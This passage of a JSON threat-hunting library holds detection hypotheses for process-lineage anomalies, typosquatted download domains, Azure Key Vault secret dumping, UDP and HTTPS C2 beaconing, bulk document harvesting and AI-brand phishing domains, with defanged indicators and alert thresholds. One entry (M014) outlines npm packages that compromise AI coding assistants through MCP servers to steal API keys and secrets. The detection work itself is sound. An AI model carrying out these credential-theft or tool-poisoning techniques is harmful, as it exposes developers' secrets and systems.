      "link": ""
    },
    "why": "- Nearly every attack technique produces an abnormal process parent-child relationship — chrome.exe spawning finger.exe, winword.exe spawning powershell.exe, or svchost.exe spawning cmd.exe with encoded arguments all stand out when measured against fleet-wide frequency baselines\n- Frequency stacking across the fleet turns rarity into signal — a process pair seen on 3 out of 10,000 endpoints is worth investigating regardless of whether that specific combination appears in any detection rule\n- This approach catches novel techniques without prior signatures because it measures deviation from normal rather than matching known bad — new LOLBINs, renamed binaries, and zero-day exploitation all produce unusual lineages\n- Process creation data with parent process context is already collected by most EDR tools and Sysmon, making this immediately actionable without deploying additional telemetry",
    "references": "- [MITRE ATT&CK T1059 - Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059/)\n- [MITRE ATT&CK T1218 - System Binary Proxy Execution](https://attack.mitre.org/techniques/T1218/)",
    "file_path": "Alchemy/M008.md"
  },
  {
    "id": "M014",
    "category": "Alchemy",
    "title": "An adversary is deploying malicious npm packages with embedded MCPInject modules targeting developer environments to compromise AI coding assistants and exfiltrate LLM API keys, secrets, and cryptocurrency wallet data.",
    "tactic": "Initial Access",
    "notes": "SANDWORM_MODE campaign; 19 malicious npm packages; MCPInject targets MCP servers; self-propagating worm; AI coding tools as pivot points",
    "tags": [
      "initial_access",
      "collection",
      "credential_access",
      "npm",
      "mcp",
      "supply_chain",
      "ai_coding_assistant",
      "T1195.002",
      "T1119",
      "T1555"
    ],
    "techniques": [
      "T1195.002",
      "T1119",
      "T1555"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Jinx (THOR Collective)",
      "link": ""
    },
    "why": "- The SANDWORM_MODE campaign deployed 19 malicious npm packages operating as a self-propagating worm through developer environments\n- The MCPInject module specifically targets Model Context Protocol servers — a brand new attack surface with almost zero defensive coverage\n- AI coding assistants often run with elevated filesystem and API access making them high-value pivot points for credential theft\n- Most organizations have zero visibility into what MCP servers their developers have connected to their AI tools",
    "references": "- [ATT&CK T1195.002](https://attack.mitre.org/techniques/T1195/002/)\n- [ATT&CK T1119](https://attack.mitre.org/techniques/T1119/)\n- [ATT&CK T1555](https://attack.mitre.org/techniques/T1555/)\n- SISA Weekly Threat Watch — SANDWORM_MODE campaign (Mar 2026)",
    "file_path": "Alchemy/M014.md"
  },
  {
    "id": "M015",
    "category": "Alchemy",
    "title": "A machine learning model can detect software downloads from potentially malicious domains by scoring download source domains against features such as domain registration age, lexical similarity to known vendor names, TLS certificate age, and historical query volume to flag trojanized installer delivery via SEO poisoning or malvertising.",
    "tactic": "Initial Access",
    "notes": "Build a classifier using web proxy or DNS logs enriched with WHOIS/domain registration data. Key features: domain age (newly registered domains < 30 days), Levenshtein distance to known vendor domains (manageengine.com, putty.org, anydesk.com), TLS certificate issuance date, historical DNS query volume in the environment (never-before-seen domains), and whether the referrer was a search engine results page. Training data can combine known-good vendor download domains with threat intel feeds of confirmed malicious download sites.",
    "tags": [
      "initial_access",
      "model_assisted",
      "seo_poisoning",
      "malvertising",
      "domain_scoring",
      "anomaly_detection",
      "T1189"
    ],
    "techniques": [
      "T1189"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Lauren Proehl",
      "link": "https://x.com/jotunvillur"
    },
    "why": "- SEO poisoning campaigns targeting IT tool downloads are a growing initial access vector used by ransomware affiliates including Akira, Rhysida, and Velvet Tempest — in the Bumblebee-to-Akira intrusion, a user searching for ManageEngine was redirected to a malicious domain delivering a trojanized installer\n- Malicious download domains share common features that are individually weak signals but become strong indicators when combined: recent registration, lexical similarity to legitimate vendor names (typosquatting), newly issued TLS certificates, and no prior query history in the environment\n- Rule-based detection struggles with this technique because attackers constantly rotate domains — a model-based approach generalizes across campaigns by learning the feature patterns rather than relying on known-bad domain lists\n- False positives from legitimate new vendors or CDNs can be managed by maintaining an allowlist of approved software sources and only scoring downloads of executable file types (MSI, EXE, DMG) from domains not on the allowlist",
    "references": "- [MITRE ATT&CK T1189 - Drive-by Compromise](https://attack.mitre.org/techniques/T1189/)\n- [The DFIR Report - From Bing Search to Ransomware: Bumblebee and AdaptixC2 Deliver Akira](https://thedfirreport.com/2025/11/04/from-bing-search-to-ransomware-bumblebee-and-adaptixc2-deliver-akira-2/)\n- [Unit 42 - Detecting Malicious Campaigns with Machine Learning](https://unit42.paloaltonetworks.com/unit42-detecting-malicious-campaigns-machine-learning/)\n- [CrowdStrike - Monitor for Malicious Domain Impersonations](https://www.crowdstrike.com/tech-hub/counter-adversary-operations/monitor-for-malicious-domain-impersonations/)\n- [Huntress - What is Typosquatting? Domain-Based Deception Explained](https://www.huntress.com/cybersecurity-101/topic/what-is-typosquatting)\n- [arXiv - DNS Typo-squatting Domain Detection: A Data Analytics & Machine Learning Based Approach](https://arxiv.org/abs/2012.13604)\n- [SentinelOne - What Is Typosquatting? Domain Attack Methods & Prevention](https://www.sentinelone.com/cybersecurity-101/cybersecurity/what-is-typosquatting/)",
    "file_path": "Alchemy/M015.md"
  },
  {
    "id": "M016",
    "category": "Alchemy",
    "title": "A time-series and per-identity volumetric model over Azure Key Vault `SecretGet` / `SecretList` / `KeyGet` / `CertificateGet` operations can distinguish a compromised identity dumping the entire secret estate (Storm-2949 retrieved dozens of secrets within 4 minutes across multiple vaults) from legitimate automation, by jointly modeling (a) secrets-per-minute rate, (b) distinct vault count, (c) distinct secret-name diversity, and (d) the caller's 30-day baseline of access cadence.",
    "tactic": "Credential Access",
    "notes": "Platform: Azure (IaaS, Key Vault). Microsoft Security Blog \"How Storm-2949 turned a compromised identity into a cloud-wide breach\" (May 18, 2026) — Storm-2949 used a compromised privileged custom-RBAC identity to retrieve \"dozens of secrets within 4 minutes\" containing DB connection strings and identity credentials, then used those for downstream Storage/SQL exfil. **Why rules alone fail**: a static threshold (\"alert on >N SecretGet/min\") either fires constantly on legitimate CI/CD pipelines that rotate 50 secrets per deploy, or never fires at all when an attacker paces retrieval to stay below it. A per-identity baseline + cross-vault enumeration signal generalizes across environments. **Data sources**: Azure Diagnostic Settings → AzureDiagnostics (Key Vault category = AuditEvent) shipped to Sentinel or Defender for Cloud `CloudAppEvents`. Required fields: `TimeGenerated`, `Resource` (vault name), `CallerIPAddress`, `identity_claim_upn_s` or `identity_claim_oid_g` (caller), `OperationName` in (`SecretGet`, `SecretList`, `KeyGet`, `KeyList`, `CertificateGet`, `CertificateList`), and `id_s` (the secret/key URI for diversity scoring). **Feature engineering** (per identity, 5-minute and 1-hour windows): (1) `secrets_per_minute` = count(SecretGet)/window_minutes — most useful single field per IT Professor 2026 study; (2) `distinct_vaults` = dcount(Resource); (3) `distinct_secret_names` = dcount(id_s) — captures broad enumeration vs. repeated reads of one rotating secret; (4) `list_then_get_ratio` = count(SecretList) followed by count(SecretGet) on the same returned names within 5 minutes — strong enumeration signal per Storm-2949 pattern; (5) `caller_baseline_zscore` = (observed_secrets_per_minute - mean_30d) / stdev_30d for that identity; (6) `caller_ip_novelty` = 1 if CallerIPAddress was not seen for this identity in the prior 30 days, else 0; (7) `non_business_hours_flag` for the caller's normal timezone; (8) `is_human_caller` = 1 if `identity_claim_upn_s` is a user UPN rather than a service principal OID. **Model approach**: Sentinel has a built-in time-series anomaly detection rule for this exact pattern (`TimeSeriesKeyvaultAccessAnomaly.yaml` in the Azure-Sentinel GitHub repo) — start there and layer the cross-vault enumeration features on top. For environments without Sentinel, an Isolation Forest or seasonal-decomposition (STL → residual z-score) over per-identity secrets_per_minute, scored against a 30-day rolling baseline, catches both the Storm-2949 burst pattern and the slower \"low-and-slow\" scrape an attacker tuned to evade simple rate alerts. **Score thresholds / fire conditions**: alert when ANY of — (a) `caller_baseline_zscore` > 4 AND `distinct_vaults` >= 3 (a human identity touching 3+ vaults is unusual per ITProfessor 2026); (b) Sentinel time-series anomaly + `is_human_caller` = 1; (c) `list_then_get_ratio` > 0.5 over a 10-minute window for any identity (full-enumeration pattern); (d) `caller_ip_novelty` = 1 AND `secrets_per_minute` > caller's 95th percentile. **Tuning**: maintain a per-tenant allowlist of known-rotation service principals (Azure DevOps pipeline SPNs, GitHub Actions OIDC, customer-key-rotation Functions) and exclude them from the human-caller branch. Cross-reference **T1078.004** (Valid Accounts: Cloud Accounts — the privileged identity is the precondition; pair with [[H167]] for the Run Command step that often follows Key Vault dumping in Storm-2949), and **T1098.003** (Account Manipulation: Additional Cloud Roles — frequent privilege escalation predecessor that gave the identity Key Vault Secrets User on too many vaults).",
    "tags": [
      "credential_access",
      "azure",
      "cloud",
      "key_vault",
      "anomaly_detection",
      "model_assisted",
      "volumetric",
      "storm_2949",
      "T1555.006"
    ],
    "techniques": [
      "T1555.006"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Lauren Proehl",
      "link": "https://x.com/jotunvillur"
    },
    "why": "- Static rate thresholds fail in both directions: a 50/min limit triggers on every CI/CD pipeline deploy and misses an attacker paced at 1 secret every 6 seconds — both are observed in production. A per-identity, per-vault baseline + cross-vault enumeration signal solves both\n- Storm-2949's 4-minute burst across multiple vaults (Microsoft, May 2026) is the textbook attacker pattern, but the same model catches the slower \"credential-mapping\" scrape that nation-state operators use when they have time — the velocity feature plus the cross-vault distinct-count both move in the same direction for both patterns\n- Cross-vault enumeration (\"3 or more vaults accessed by a single human identity\") is a documented high-signal feature per ITProfessor's April 2026 Key Vault hunting writeup, and is essentially invisible to rule-based alerting that scopes per-vault — making it the single most useful feature to add on top of the built-in Sentinel time-series anomaly rule\n- Key Vault is the credential-dumping equivalent of `lsass.exe` in the cloud: once an identity has both `Microsoft.KeyVault/vaults/secrets/read` and breadth across vaults, every downstream system whose connection string lives in any of those vaults is reachable. Catching the read burst is the cheapest detection point in the whole chain — the alternative is detecting compromise after the SQL/Storage/Functions hit",
    "references": "- [MITRE ATT&CK T1555.006 - Credentials from Password Stores: Cloud Secrets Management Stores](https://attack.mitre.org/techniques/T1555/006/)\n- [Microsoft Security Blog - How Storm-2949 turned a compromised identity into a cloud-wide breach](https://www.microsoft.com/en-us/security/blog/2026/05/18/storm-2949-turned-compromised-identity-into-cloud-wide-breach/)\n- [Azure-Sentinel - TimeSeriesKeyvaultAccessAnomaly.yaml (built-in time-series anomaly rule)](https://github.com/Azure/Azure-Sentinel/blob/master/Solutions/Azure%20Key%20Vault/Analytic%20Rules/TimeSeriesKeyvaultAccessAnomaly.yaml)\n- [IT Professor - Azure Key Vault Threat Hunting: 8 Production-Ready KQL (2026)](https://www.itprofessor.cloud/azure-key-vault-threat-hunting-kql/)\n- [Microsoft Learn - Alerts for Azure Key Vault (Defender for Cloud)](https://learn.microsoft.com/en-us/azure/defender-for-cloud/alerts-azure-key-vault)\n- [Microsoft Community Hub - Visibility of Azure Key Vault activity in Sentinel](https://techcommunity.microsoft.com/t5/microsoft-sentinel-blog/visibility-of-azure-key-vault-activity-in-sentinel-azure-key/ba-p/2140751)\n- [OneUptime - Enable Microsoft Defender for Key Vault to Detect Unusual Secret Access Patterns (Feb 2026)](https://oneuptime.com/blog/post/2026-02-16-how-to-enable-microsoft-defender-for-key-vault-to-detect-unusual-secret-access-patterns/view)",
    "file_path": "Alchemy/M016.md"
  },
  {
    "id": "M017",
    "category": "Alchemy",
    "title": "A per-host, per-destination time-series model over outbound UDP (and low-data TCP) flows to non-standard high ports can surface Argamal-style beaconing — periodic small datagrams to a fixed external endpoint (the RAT's UDP heartbeat on port 57441, payload channel 63559/UDP, TCP C2 on 3747) — by jointly modeling (a) inter-packet interval regularity (low jitter / high periodicity), (b) packet-size uniformity, (c) the connection's duration-to-bytes ratio, and (d) the destination's rarity across the estate, rather than relying on a static port or domain blocklist.",
    "tactic": "Command and Control",
    "notes": "Platform: Windows (endpoint and network telemetry; the model is data-source-agnostic and also applies to Linux/macOS beacons). Driven by Securelist (Kaspersky GReAT) \"Argamal: Malware hidden in hentai games\" (June 3, 2026). Argamal sends UDP heartbeats to its C2 on **port 57441/UDP** (carrying security-product enumeration, uptime, idle time, arch, IP, username), uses **63559/UDP** as a payload-update channel, and an extended **3747/TCP** mode with a substitution-cipher; C2s observed: `asper1[.]freeddns[.]org`, `Winst0[.]kozow[.]com`, `country1[.]ignorelist[.]com` (all → `186[.]158.223.35`, ASN 11664). **Why rules alone fail**: a static \"block 57441/UDP\" rule dies the moment the operator changes the port, and domain blocklists die on DDNS rotation — but the *shape* of the beacon (regular interval, near-constant tiny payload, long-lived low-byte flow to a rare external host) is intrinsic to C2 heartbeating and generalizes across port/domain changes. **Data sources**: Zeek `conn.log` (`id.resp_p`, `proto=udp/tcp`, `duration`, `orig_bytes`, `resp_bytes`, `orig_pkts`) or firewall/NetFlow; Sysmon **Event ID 3** (NetworkConnect) and **Event ID 22** (DNS) on Windows endpoints; MDE `DeviceNetworkEvents`. **Feature engineering** (per `src_host` × `dst_ip` × `dst_port`, rolling 24h/7d windows): (1) `interval_cv` = stddev/mean of inter-connection times — beacons have low coefficient of variation even with jitter; (2) `fft_peak_power` — a dominant frequency in the connection-time series (periodicity score); (3) `payload_size_entropy` / size coefficient of variation — heartbeats are near-uniform tiny datagrams; (4) `bytes_per_second` — very low for a long-lived flow; (5) `dst_rarity` = inverse of how many hosts in the estate ever talk to that dst (rare external destination); (6) `nonstandard_port_flag` for ephemeral/high ports with no registered service; (7) `udp_no_dns_correlation` = UDP flow to an IP with no preceding A/AAAA lookup or to a DDNS-resolved host. **Model approach**: start with an interval-regularity detector (e.g. RITA-style beacon scoring, or an autocorrelation/FFT periodicity test) layered with an Isolation Forest over the feature vector, scored against a 30-day per-host baseline of normal periodic traffic (NTP, telemetry, software update pings) which is then allowlisted. **Fire conditions**: alert when `interval_cv` < 0.15 AND `dst_rarity` high AND `bytes_per_second` low — OR Isolation-Forest anomaly score past the 99th percentile with `nonstandard_port_flag`=1 — OR a UDP beacon to a DDNS host (`*.freeddns.org`, `*.kozow.com`, `*.ignorelist.com`) with periodic small payloads. **Tuning**: maintain a per-estate allowlist of legitimate periodic UDP (NTP/123, telemetry agents, VoIP/SIP, game traffic on known ports) so the model scores deviation from each host's own normal. Cross-reference **T1571** (Non-Standard Port — the high-port C2), **T1568.002** (Dynamic Resolution: Domain Generation / DDNS — the rotating `freeddns`/`kozow` C2s), and **T1095** parent. UDP-on-a-rare- high-port with metronomic timing is the structural signature; the model catches it regardless of port/domain rotation.",
    "tags": [
      "command_and_control",
      "windows",
      "beaconing",
      "udp",
      "anomaly_detection",
      "model_assisted",
      "non_standard_port",
      "argamal",
      "T1095"
    ],
    "techniques": [
      "T1095"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Lauren Proehl",
      "link": "https://x.com/jotunvillur"
    },
    "why": "- UDP heartbeat beaconing is invisible to most C2 detection, which is tuned for HTTP/S and DNS — a small datagram to a high UDP port every N seconds generates no proxy log, no TLS SNI, and no DNS query if the IP is hardcoded. Modeling the *timing and shape* of the flow rather than its content is the only way to catch a heartbeat that carries no application-layer protocol to inspect, which is exactly why Argamal chose UDP/57441 for its beacon\n- Static indicators decay immediately: port 57441, the `186.158.223.35` IP, and the `freeddns`/`kozow`/`ignorelist` DDNS names will all rotate. The behavioral features — low interval coefficient of variation, near-uniform tiny payloads, a long-lived low-byte flow to a rare external destination — are intrinsic to beaconing and survive that rotation, so a model trained on shape generalizes to the next Argamal variant and to unrelated RATs that heartbeat the same way\n- A static threshold (\"> N UDP packets to a high port\") fails in both directions: it floods on legitimate periodic UDP (NTP, telemetry, VoIP, game netcode) and misses a slow beacon paced to blend in. Scoring each host against its own 30-day baseline of normal periodic traffic — then allowlisting the known-good periodics — is what separates a C2 heartbeat from the genuinely large volume of benign regular UDP on a real network\n- The beacon is often the only network-visible artifact of an endpoint compromise whose on-host stages (signed-looking DLL side-load, COM-hijack persistence — see [[H178]], [[H177]]) were quiet. Catching the periodic outbound flow gives a second, independent detection plane: even if the host-based hunts miss the implant, the metronomic UDP to a rare destination is a durable, model-detectable tell that something is calling home",
    "references": "- [MITRE ATT&CK T1095 - Non-Application Layer Protocol](https://attack.mitre.org/techniques/T1095/)\n- [MITRE ATT&CK T1571 - Non-Standard Port](https://attack.mitre.org/techniques/T1571/)\n- [Securelist (Kaspersky) - Argamal: Malware hidden in hentai games](https://securelist.com/argamal-rat-distributed-with-hentai-games/119999/)\n- [Active Countermeasures - RITA: Detecting beacons with interval and jitter analysis](https://www.activecountermeasures.com/free-tools/rita/)\n- [Elastic Security - Beaconing detection with statistical and ML methods](https://www.elastic.co/security-labs/identifying-beaconing-malware-using-elastic)\n- [Zeek - conn.log fields for network beacon hunting](https://docs.zeek.org/en/master/logs/conn.html)\n- [Splunk - Detecting C2 beaconing over UDP with timing and volume analytics](https://www.splunk.com/en_us/blog/security/threat-hunting-for-beacons.html)",
    "file_path": "Alchemy/M017.md"
  },
  {
    "id": "M018",
    "category": "Alchemy",
    "title": "A per-identity volumetric/behavioral model over file-and-directory access can surface UNC3753 (Luna Moth) bulk document harvesting — a single user account, shortly after RMM/remote access is established, fanning out across local directories, OneDrive, mapped network drives, and the iManage document store and touching far more files/folders (and far more sensitive-keyword documents — W-2, W-9, 1099, audit, SSN, client agreements) than that identity's own 30-day baseline — rather than relying on a static threshold that admins and power users trip constantly.",
    "tactic": "Discovery",
    "notes": "Platform: Windows / M365 (endpoint + document-store + cloud telemetry; the model is data-source-agnostic). Driven by Mandiant/GTIG \"Seeking Counsel: Ongoing Targeted Campaign Against US Law Firms\" (UNC3753 / Luna Moth / Silent Ransom Group, June 5, 2026), which described operators who, once hands-on, \"map local directories, enumerate active OneDrive folders, crawl mapped network drives\" and run keyword searches across iManage for tax forms (W-2, W-9, 1099), audit files, corporate client agreements, and SSNs before staging multi-GB exfil. **Why rules alone fail**: File and Directory Discovery (T1083) is something admins, lawyers, and indexing services do all day, so a static \"N file accesses\" rule either floods or misses; the malicious signal is *deviation from each identity own normal breadth and rate*, which only a per-user baseline captures. **Data sources**: Windows Security **Event ID 4663** (object access on files / shares) and **5145** (network share object access) with Audit Object Access / Detailed File Share enabled; Sysmon **Event ID 11** (FileCreate) for local staging; MDE `DeviceFileEvents`; M365 / Office Suite Unified Audit Log `FileAccessed`, `FileDownloaded`, `SearchQueryPerformed`, and OneDrive/SharePoint access events; iManage audit/work-history logs (open, export, search). **Feature engineering** (per user x rolling 1h/24h window vs 30-day baseline): (1) `distinct_dirs_touched` and `distinct_shares_touched`; (2) `files_accessed_rate` (files/min); (3) `sensitive_keyword_hits` = count of accessed/searched items matching a lexicon (W-2, W-9, 1099, K-1, audit, SSN, \"client agreement\", \"engagement letter\"); (4) `breadth_z` = z-score of directories touched vs this user own mean/stddev; (5) `new_repo_access` = first-ever access by this identity to a given share/iManage workspace; (6) `post_rmm_proximity` = time since an RMM/remote-access logon on the same host (ties the burst to [[H181]]/[[H182]]). **Model approach**: per-user robust z-score / median-absolute-deviation on breadth+rate, layered with an Isolation Forest over the feature vector, after subtracting known bulk actors (backup/indexing/eDiscovery service accounts) via an allowlist. **Fire conditions**: alert when `breadth_z` > 3 AND `sensitive_keyword_hits` elevated AND `new_repo_access` = true — OR Isolation-Forest score past the 99th percentile within an hour of an RMM logon. **Tuning**: maintain an allowlist of legitimate bulk-access identities (DMS indexers, backup, eDiscovery, paralegal mass-export workflows) and score deviation from each identity own normal. Cross-ref **T1005** (Data from Local System), **T1213** (Data from Information Repositories / iManage), **T1135** (Network Share Discovery); the staging that follows feeds cloud exfil (T1567.002) and USB exfil ([[H183]]).",
    "tags": [
      "discovery",
      "windows",
      "m365",
      "imanage",
      "data_collection",
      "anomaly_detection",
      "model_assisted",
      "luna_moth",
      "T1083"
    ],
    "techniques": [
      "T1083"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Lauren Proehl",
      "link": "https://x.com/jotunvillur"
    },
    "why": "- File and Directory Discovery is the textbook example of a technique that is unhuntable with a static rule — every knowledge worker and every indexing service enumerates files constantly — so the only way to make Luna Moth's harvesting visible is to model each identity against its own normal breadth and rate and alert on the deviation, which is squarely a model-assisted (Alchemy) problem, not a signature one.\n- The malicious burst has a distinctive *shape* even when each individual access looks benign: a single account suddenly touching many more directories, more shares, and far more sensitive-keyword documents than it ever has, often within minutes of an RMM logon. That multi-feature anomaly is detectable precisely because it departs from a stable per-user baseline that legitimate work rarely violates.\n- Anchoring on behavior rather than indicators makes the detection durable: Luna Moth rotates infrastructure, RMM tools, and personas, but the data-theft business model *requires* a wide, fast crawl for valuable documents — so a model trained on enumeration breadth/rate and sensitive-keyword density generalizes across campaigns and even to unrelated insider/extortion actors.\n- This hunt is the connective tissue between the access hunts and the exfil hunts: it fires in the window after [[H181]]/[[H182]] establish access but before the cloud/USB exfil ([[H183]]) completes, giving responders their best chance to intervene while the data is being staged rather than after it has left.",
    "references": "- [MITRE ATT&CK T1083 - File and Directory Discovery](https://attack.mitre.org/techniques/T1083/)\n- [Mandiant / GTIG - Seeking Counsel: Ongoing Targeted Campaign Against US Law Firms (source report)](https://cloud.google.com/blog/topics/threat-intelligence/targeted-campaign-us-law-firms/)\n- [MITRE ATT&CK T1213 - Data from Information Repositories](https://attack.mitre.org/techniques/T1213/)\n- [Microsoft Learn - Search the audit log (FileAccessed / SearchQueryPerformed / FileDownloaded)](https://learn.microsoft.com/en-us/purview/audit-log-activities)\n- [Elastic Security Labs - Anomaly detection and behavioral baselining for data access](https://www.elastic.co/security-labs/)\n- [Varonis - Detecting abnormal data access and insider data theft](https://www.varonis.com/blog/data-exfiltration)\n- [Unit 42 - Threat Assessment: Luna Moth Callback Phishing Campaign](https://unit42.paloaltonetworks.com/luna-moth-callback-phishing/)",
    "file_path": "Alchemy/M018.md"
  },
  {
    "id": "M019",
    "category": "Alchemy",
    "title": "SPECTRALVIPER conceals C2 in HTTPS with encrypted host-profiling data embedded in HTTP Cookie headers (prefixes euconsent-v2= or zd_cs_pm=) to fixed endpoints, so a model that scores outbound TLS/HTTPS sessions on JA3 rarity, beacon periodicity, certificate/domain novelty, and Cookie-header entropy will surface the encrypted-channel beacon even though payloads are encrypted.",
    "tactic": "Command and Control",
    "notes": "Windows / network egress. Data sources: TLS/proxy/NGFW logs (Zeek conn.log + ssl.log + http.log, Suricata TLS events, or EDR network telemetry); fields needed = src/dst IP, dst domain/SNI, JA3/JA3S hash, TLS version + cipher, cert issuer/subject + validity, bytes_out/bytes_in, timestamps, and (where TLS-inspected or via proxy) HTTP Cookie header + User-Agent + URI. Feature engineering: (1) per src->dst connection inter-arrival times -> mean interval + jitter coefficient (low variance = beacon); (2) JA3/JA3S frequency across the fleet (rare-globally + repeated-on-one-host = suspicious); (3) destination domain novelty/age + ratio of NXDOMAIN-adjacent or low-prevalence FQDNs; (4) Shannon entropy of Cookie header value and flag known prefixes euconsent-v2= / zd_cs_pm= carrying high-entropy blobs; (5) bytes_out:bytes_in asymmetry; (6) requests to single-page deep paths (e.g. /apparatus/wind/twig/statement.html pattern). Model approach: unsupervised beaconing/periodicity detection (FFT or autocorrelation on connection timestamps) + isolation-forest/clustering over the JA3-rarity + entropy + asymmetry feature vector; optionally a supervised classifier seeded with known-bad JA3s. Fire conditions: a src host with (low-jitter periodic outbound TLS) AND (rare/never-before-seen JA3 OR newly-registered/low-prevalence destination) AND (high-entropy Cookie value, esp. euconsent-v2=/zd_cs_pm= prefix). Tuning/allowlist: exclude sanctioned beacon-like telemetry (EDR/AV/MDM/RMM/OS update/CDN/telemetry domains and their JA3s); maintain a fleet JA3 prevalence table refreshed weekly; suppress consent-management platforms that legitimately set euconsent-v2 cookies by requiring the beacon+rare-JA3 conditions to co-occur, not the cookie alone. IOC seeds from report: financemachinelearning[.]com, gatewayrvcenter[.]com. Cross-ref [[H187]] (side-loaded SPECTRALVIPER) and [[B024]] (its lateral pipes) for host-side corroboration of any flagged egress.",
    "tags": [
      "command_and_control",
      "encrypted_channel",
      "ja3",
      "beaconing",
      "oceanlotus",
      "apt32",
      "spectralviper",
      "tls",
      "T1573"
    ],
    "techniques": [
      "T1573"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Lauren Proehl",
      "link": "https://x.com/jotunvillur"
    },
    "why": "- ESET states all SPECTRALVIPER C&C is encrypted over HTTPS with host-profiling data hidden in Cookie headers (`euconsent-v2=` historical, `zd_cs_pm=` in this campaign) — payload inspection is impossible, so detection must rely on metadata/behavioral features rather than content.\n- Encrypted channels (T1573) are best surfaced by TLS-fingerprint rarity (JA3/JA3S) plus beacon periodicity, the classic model-assisted approach for content-blind C2 — squarely Alchemy, not a single deterministic query.\n- The campaign provides distinctive cookie prefixes and deep single-page beacon URLs that become strong high-confidence features when combined with low-jitter periodicity and globally-rare JA3.\n- Embedding encryption keys/config in the malware makes the *behavior* (regular small encrypted callbacks to a fixed, low-prevalence endpoint) the durable signal even as domains rotate — an anomaly model generalizes past the named IOCs.",
    "references": "- [MITRE ATT&CK T1573 — Encrypted Channel](https://attack.mitre.org/techniques/T1573/)\n- [source report — OceanLotus: From external espionage to domestic targeting (ESET)](https://www.welivesecurity.com/en/eset-research/oceanlotus-external-espionage-domestic-targeting/)\n- [SOC Investigation — Finding the Evil in TLS 1.2 Traffic (JA3/encrypted malware)](https://www.socinvestigation.com/finding-the-evil-in-tls-1-2-traffic-detecting-malware-on-encrypted-traffic/)\n- [Active Countermeasures — Detecting C2 When You Can't See the Queries (beaconing)](https://www.activecountermeasures.com/malware-of-the-day-encrypted-dns-comparison-detecting-c2-when-you-cant-see-the-queries/)\n- [Atomic Red Team — T1573 Encrypted Channel](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1573/T1573.md)\n- [ManageEngine Log360 — Detecting Encrypted Channel (T1573) C2 with SIEM](https://www.manageengine.com/log-management/mitre-attack/command-and-control/encrypted-channel.html)",
    "file_path": "Alchemy/M019.md"
  },
  {
    "id": "M020",
    "category": "Alchemy",
    "title": "Threat actors register lookalike and brand-adjacent domains impersonating popular AI platforms (ChatGPT/OpenAI, Claude/Anthropic, DeepSeek, Copilot, Gemini, Grok) to host phishing landing pages, AiTM credential interception, and fake-installer downloads. By modeling string similarity (edit distance / homoglyph / token-substitution) between resolved/clicked domains and a curated list of legitimate AI-brand domains, and weighting by domain age (newly-registered) and first-seen-in-environment, anomalous AI-impersonation domains can be surfaced before users submit credentials or download payloads.",
    "tactic": "Resource Development",
    "notes": "ALCHEMY ANALYTIC — string-similarity + freshness scoring, not a static IOC match. Seed a known-good list of legitimate AI-brand domains (openai.com, chatgpt.com, anthropic.com, claude.ai, deepseek.com, copilot.microsoft.com, gemini.google.com, x.ai). Candidate population: domains observed in M365 EmailEvents/UrlClickEvents, DeviceNetworkEvents, proxy logs, and DNS resolver logs over a rolling window. Scoring features: (1) Damerau-Levenshtein / Jaro-Winkler distance and homoglyph/token-permutation match to a seed brand (generate the permutation set with dnstwist); (2) brand token present but on a non-official TLD or with affix words (e.g., -update, -plus, -appeal, account-, servicing.); (3) domain age < 30 days (newly-registered) via WHOIS/RDAP; (4) first-seen-in-environment within window; (5) certificate-transparency hit for a new cert on a similar SAN. Alert when a domain scores high on similarity AND (NRD OR first-seen) — this isolates lookalikes from legitimate AI usage (handled by [[H193]] on the endpoint execution side). KQL starting point: UrlClickEvents/EmailUrlInfo project Url, parse registrable domain, evaluate against the similarity UDF over the seed list; join to DeviceNetworkEvents RemoteUrl for resolution and to an NRD feed. Article-confirmed patterns to validate the model: legendarytrendsbay[.]shop/ChatGPT/, servicing.pureplantcravings[.]com, dash.awaydouble[.]org, brand-token email lures (\"Claude Appeal Request\", \"ChatGPT Plus\"). Tune by suppressing sanctioned vendor and CDN domains; baseline normal AI-tool domain usage first to keep false positives down.",
    "tags": [
      "resource_development",
      "phishing",
      "typosquat",
      "lookalike_domain",
      "ai_lure",
      "brand_impersonation",
      "newly_registered_domain",
      "T1583.001"
    ],
    "techniques": [
      "T1583.001"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Lauren Proehl",
      "link": "https://x.com/jotunvillur"
    },
    "why": "- The campaigns hinge on brand-token domains and multi-hop redirects (e.g., `legendarytrendsbay[.]shop/ChatGPT/`, `servicing.pureplantcravings[.]com`), so a similarity-plus-freshness model generalizes across the rotating infrastructure better than any blocklist.\n- Static IOC lists go stale within hours (DeepSeek campaign went from setup to first victim in ~4 hours); an analytic that scores newly-seen domains catches the next iteration on day zero.\n- Combining string similarity with newly-registered-domain and first-seen signals separates malicious lookalikes from the surge of legitimate AI-tool adoption, keeping the analytic precise.\n- This is the network/email companion to the endpoint execution hunt ([[H193]]): together they cover the lure-delivery and the payload-execution halves of the same intrusion chain.",
    "references": "- [MITRE ATT&CK T1583.001 — Acquire Infrastructure: Domains](https://attack.mitre.org/techniques/T1583/001/)\n- [source report — Microsoft: AI brands as bait](https://www.microsoft.com/en-us/security/blog/2026/06/08/ai-brands-as-bait-how-threat-actors-are-using-the-ai-hype-in-social-engineering/)\n- [dnstwist — domain permutation engine for homograph/typosquat/brand-impersonation detection](https://github.com/elceef/dnstwist)\n- [Zscaler ThreatLabz — Phishing, Typosquatting, and Brand Impersonation Trends and Tactics](https://www.zscaler.com/blogs/security-research/phishing-typosquatting-and-brand-impersonation-trends-and-tactics)\n- [Valimail — Domain Lookalike Finder / detecting typosquatting & spoofing risk](https://www.valimail.com/domain-lookalike-finder/)\n- [Breachsense — Typosquatting: Detect Lookalike Domains Before Attacks](https://www.breachsense.com/typosquatting/)",
    "file_path": "Alchemy/M020.md"
  }
];
